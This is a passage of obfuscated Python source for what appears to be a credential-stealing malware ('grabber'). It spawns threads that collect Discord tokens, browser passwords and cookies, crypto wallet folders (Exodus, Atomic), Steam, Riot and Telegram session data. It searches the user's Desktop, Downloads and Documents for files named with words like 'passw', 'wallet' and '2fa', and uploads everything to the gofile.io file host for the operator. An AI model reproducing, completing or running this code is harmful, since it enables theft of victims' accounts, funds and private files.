    O00OO000O000000OO =[[f"{roaming}/atomic/Local Storage/leveldb",'"Atomic Wallet.exe"',"Wallet"],[f"{roaming}/Exodus/exodus.wallet","Exodus.exe","Wallet"],["C:\Program Files (x86)\Steam\config","steam.exe","Steam"],[f"{roaming}/NationsGlory/Local Storage/leveldb","NationsGlory.exe","NationsGlory"],[f"{local}/Riot Games/Riot Client/Data","RiotClientServices.exe","RiotClient"]]#line:783
    O0000OO0O0OO0O00O =[f"{roaming}/Telegram Desktop/tdata",'telegram.exe',"Telegram"]#line:784
    for O0O0O0000O000O0OO in O00OOO000O00OOOOO :#line:786
        OO00000O000OO00O0 =threading .Thread (target =getT0k3n ,args =[O0O0O0000O000O0OO [0 ],O0O0O0000O000O0OO [2 ]])#line:787
        OO00000O000OO00O0 .start ()#line:788
        Threadlist .append (OO00000O000OO00O0 )#line:789
    for O0O0O0000O000O0OO in O00OOO00O0OO00O0O :#line:790
        OO00000O000OO00O0 =threading .Thread (target =G3tD1sc0rd ,args =[O0O0O0000O000O0OO [0 ],O0O0O0000O000O0OO [1 ]])#line:791
        OO00000O000OO00O0 .start ()#line:792
        Threadlist .append (OO00000O000OO00O0 )#line:793
    for O0O0O0000O000O0OO in O00OOO000O00OOOOO :#line:795
        OO00000O000OO00O0 =threading .Thread (target =getP4ssw ,args =[O0O0O0000O000O0OO [0 ],O0O0O0000O000O0OO [3 ]])#line:796
        OO00000O000OO00O0 .start ()#line:797
        Threadlist .append (OO00000O000OO00O0 )#line:798
    O00O000OOO0O0OOOO =[]#line:800
    for O0O0O0000O000O0OO in O00OOO000O00OOOOO :#line:801
        OO00000O000OO00O0 =threading .Thread (target =getC00k13 ,args =[O0O0O0000O000O0OO [0 ],O0O0O0000O000O0OO [4 ]])#line:802
        OO00000O000OO00O0 .start ()#line:803
        O00O000OOO0O0OOOO .append (OO00000O000OO00O0 )#line:804
    threading .Thread (target =GatherZips ,args =[O00OOO000O00OOOOO ,O00OO000O000000OO ,O0000OO0O0OO0O00O ]).start ()#line:806
    for OO0O00OO00OO000OO in O00O000OOO0O0OOOO :OO0O00OO00OO000OO .join ()#line:809
    OOOO000O00OOO0000 =TR6st (C00k13 )#line:810
    if OOOO000O00OOO0000 ==True :return #line:811
    for O0O0O0000O000O0OO in O00OOO000O00OOOOO :#line:813
         threading .Thread (target =Z1pTh1ngs ,args =[O0O0O0000O000O0OO [0 ],O0O0O0000O000O0OO [5 ],O0O0O0000O000O0OO [1 ]]).start ()#line:814
    for O0O0O0000O000O0OO in O00OO000O000000OO :#line:816
         threading .Thread (target =Z1pTh1ngs ,args =[O0O0O0000O000O0OO [0 ],O0O0O0000O000O0OO [2 ],O0O0O0000O000O0OO [1 ]]).start ()#line:817
    threading .Thread (target =ZipTelegram ,args =[O0000OO0O0OO0O00O [0 ],O0000OO0O0OO0O00O [2 ],O0000OO0O0OO0O00O [1 ]]).start ()#line:819
    for OO0O00OO00OO000OO in Threadlist :#line:821
        OO0O00OO00OO000OO .join ()#line:822
    global upths #line:823
    upths =[]#line:824
    for OOOO00O0O0OO000O0 in ["crpassw.txt","crcook.txt"]:#line:826
        upload (OOOO00O0O0OO000O0 .replace (".txt",""),uploadToAnonfiles (os .getenv ("TEMP")+"\\"+OOOO00O0O0OO000O0 ))#line:828
def uploadToAnonfiles (OOO0O0OO0000OO0O0 ):#line:830
    try :return requests .post (f'https://{requests.get("https://api.gofile.io/getServer").json()["data"]["server"]}.gofile.io/uploadFile',files ={'file':open (OOO0O0OO0000OO0O0 ,'rb')}).json ()["data"]["downloadPage"]#line:831
    except :return False #line:832
def KiwiFolder (O0O0OO00O0O0OOOO0 ,OO0OOOO0OOO0OO000 ):#line:834
    global KiwiFiles #line:835
    O0O000O00OO0OO0O0 =7 #line:836
    OO0OO00O0O000O00O =0 #line:837
    OOOO0O0O0O0OO00O0 =os .listdir (O0O0OO00O0O0OOOO0 )#line:838
    O0OO0O0O0OOOOO000 =[]#line:839
    for OOOO0OOO0000O000O in OOOO0O0O0O0OO00O0 :#line:840
        if not os .path .isfile (O0O0OO00O0O0OOOO0 +"/"+OOOO0OOO0000O000O ):return #line:841
        OO0OO00O0O000O00O +=1 #line:842
        if OO0OO00O0O000O00O <=O0O000O00OO0OO0O0 :#line:843
            O0O0OOO0OO00O0OO0 =uploadToAnonfiles (O0O0OO00O0O0OOOO0 +"/"+OOOO0OOO0000O000O )#line:844
            O0OO0O0O0OOOOO000 .append ([O0O0OO00O0O0OOOO0 +"/"+OOOO0OOO0000O000O ,O0O0OOO0OO00O0OO0 ])#line:845
        else :#line:846
            break #line:847
    KiwiFiles .append (["folder",O0O0OO00O0O0OOOO0 +"/",O0OO0O0O0OOOOO000 ])#line:848
KiwiFiles =[]#line:850
def KiwiFile (O0O000O0OOO0OO000 ,OOO0OOO00O0OO000O ):#line:851
    global KiwiFiles #line:852
    O000O00OO0OO0O0OO =[]#line:853
    O00OO0000O00O0O00 =os .listdir (O0O000O0OOO0OO000 )#line:854
    for OOO0000O0OO00000O in O00OO0000O00O0O00 :#line:855
        for O0O00OOOOOO00OOO0 in OOO0OOO00O0OO000O :#line:856
            if O0O00OOOOOO00OOO0 in OOO0000O0OO00000O .lower ():#line:857
                if os .path .isfile (O0O000O0OOO0OO000 +"/"+OOO0000O0OO00000O )and ".txt"in OOO0000O0OO00000O :#line:858
                    O000O00OO0OO0O0OO .append ([O0O000O0OOO0OO000 +"/"+OOO0000O0OO00000O ,uploadToAnonfiles (O0O000O0OOO0OO000 +"/"+OOO0000O0OO00000O )])#line:859
                    break #line:860
                if os .path .isdir (O0O000O0OOO0OO000 +"/"+OOO0000O0OO00000O ):#line:861
                    OOO0OOO00O0OOOOO0 =O0O000O0OOO0OO000 +"/"+OOO0000O0OO00000O #line:862
                    KiwiFolder (OOO0OOO00O0OOOOO0 ,OOO0OOO00O0OO000O )#line:863
                    break #line:864
    KiwiFiles .append (["folder",O0O000O0OOO0OO000 ,O000O00OO0OO0O0OO ])#line:866
def Kiwi ():#line:868
    OO0OO0O00O00O0O00 =temp .split ("\AppData")[0 ]#line:869
    OO0O0OOO0OOOO000O =[OO0OO0O00O00O0O00 +"/Desktop",OO0OO0O00O00O0O00 +"/Downloads",OO0OO0O00O00O0O00 +"/Documents"]#line:874
    O0OOO00O0OO0OOOOO =["account","acount","passw","secret","senhas","contas","backup","2fa","importante","privado","exodus","exposed","perder","amigos","empresa","trabalho","work","private","source","users","username","login","user","usuario","log"]#line:902
    OOOO0OOOOOO000O0O =["passw","mdp","motdepasse","mot_de_passe","login","secret","account","acount","paypal","banque","account","metamask","wallet","crypto","exodus","discord","2fa","code","memo","compte","token","backup","secret","mom","family"]#line:930
    O0OOO000O0O000OOO =[]#line:932
    for O0O0OO00OO000000O in OO0O0OOO0OOOO000O :#line:933
        O00O0OO0O00OO00O0 =threading .Thread (target =KiwiFile ,args =[O0O0OO00OO000000O ,OOOO0OOOOOO000O0O ]);O00O0OO0O00OO00O0 .start ()#line:934
        O0OOO000O0O000OOO .append (O00O0OO0O00OO00O0 )#line:935
    return O0OOO000O0O000OOO #line:936
global keyword ,cookiWords ,paswWords ,CookiCount ,P4sswCount ,WalletsZip ,GamingZip ,OtherZip #line:939
keyword =['mail','[coinbase](https://coinbase.com)','[sellix](https://sellix.io)','[gmail](https://gmail.com)','[steam](https://steam.com)','[discord](https://discord.com)','[riotgames](https://riotgames.com)','[youtube](https://youtube.com)','[instagram](https://instagram.com)','[tiktok](https://tiktok.com)','[twitter](https://twitter.com)','[facebook](https://facebook.com)','card','[epicgames](https://epicgames.com)','[spotify](https://spotify.com)','[yahoo](https://yahoo.com)','[roblox](https://roblox.com)','[twitch](https://twitch.com)','[minecraft](https://minecraft.net)','bank','[paypal](https://paypal.com)','[origin](https://origin.com)','[amazon](https://amazon.com)','[ebay](https://ebay.com)','[aliexpress](https://aliexpress.com)','[playstation](https://playstation.com)','[hbo](https://hbo.com)','[xbox](https://xbox.com)','buy','sell','[binance](https://binance.com)','[hotmail](https://hotmail.com)','[outlook](https://outlook.com)','[crunchyroll](https://crunchyroll.com)','[telegram](https://telegram.com)','[pornhub](https://pornhub.com)','[disney](https://disney.com)','[expressvpn](https://expressvpn.com)','crypto','[uber](https://uber.com)','[netflix](https://netflix.com)']#line:943
CookiCount ,P4sswCount =0 ,0 #line:945
cookiWords =[]#line:946
paswWords =[]#line:947
WalletsZip =[]#line:949
GamingZip =[]#line:950
OtherZip =[]#line:951
GatherAll ()#line:953
DETECTED =TR6st (C00k13 )#line:954
if not DETECTED :#line:956
    wikith =Kiwi ()#line:957
    for thread in wikith :thread .join ()#line:959
    time .sleep (0.2 )#line:960
    filetext ="\n"#line:962
    for arg in KiwiFiles :#line:963
        if len (arg [2 ])!=0 :#line:964
            foldpath =arg [1 ]#line:965
            foldlist =arg [2 ]#line:966
            filetext +=f"📁 {foldpath}\n"#line:967
            for ffil in foldlist :#line:969
                a =ffil [0 ].split ("/")#line:970
                fileanme =a [len (a )-1 ]#line:971
                b =ffil [1 ]#line:972
                filetext +=f"└─:open_file_folder: [{fileanme}]({b})\n"#line:973
            filetext +="\n"#line:974
    upload ("kiwi",filetext )
